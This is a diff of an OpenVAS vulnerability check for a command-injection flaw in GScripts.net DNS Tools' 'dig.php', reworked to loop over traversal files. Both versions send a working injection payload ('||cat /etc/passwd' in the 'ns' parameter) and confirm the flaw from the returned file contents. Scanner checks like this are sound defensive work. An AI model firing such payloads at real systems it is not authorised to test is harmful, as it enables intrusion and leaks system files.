@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: GScripts_cve_2009_1361.nasl 4970 2017-01-09 15:00:59Z teissa $
+# $Id: GScripts_cve_2009_1361.nasl 5767 2017-03-29 13:32:35Z cfi $
 #
 # GScripts.net DNS Tools 'dig.php' Remote Command Execution
 # Vulnerability
@@ -32,22 +32,19 @@ tag_summary = "GScripts.net DNS Tools is prone to a remote command-execution
   Successful attacks can compromise the affected software and possibly
   the computer.";
 
-
 if (description)
 {
  script_id(100182);
- script_version("$Revision: 4970 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-09 16:00:59 +0100 (Mon, 09 Jan 2017) $");
+ script_version("$Revision: 5767 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:32:35 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-05-02 19:46:33 +0200 (Sat, 02 May 2009)");
  script_bugtraq_id(34559);
  script_cve_id("CVE-2009-1361", "CVE-2009-1916");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-
  script_name("GScripts.net DNS Tools 'dig.php' Remote Command Execution Vulnerability");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -60,26 +57,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dir = make_list("/whois","/dns_tools", cgi_dirs());
+files = traversal_files( "linux" );
 
-foreach d (dir)
-{ 
- url = string(d, "/dig.php?ns=||cat%20/etc/passwd&host=example.org&query_type=NS&status=digging");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
- if( buf == NULL )continue;
+foreach dir( make_list_unique( "/whois", "/dns_tools", cgi_dirs( port:port ) ) ) { 
 
- if (egrep(pattern:"root:.*:0:[01]:.*", string: buf) ) 
-   {
-     security_message(port:port);
-     exit(0);    
-   }
+  if( dir == "/" ) dir = "";
+
+  foreach file (keys(files)) {
+
+    url = string(dir, "/dig.php?ns=||cat%20/",files[file],"&host=example.org&query_type=NS&status=digging");
+
+    if(http_vuln_check(port:port, url:url,pattern:file)) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
+  }
 }
 
-exit(0);
+exit( 99 );
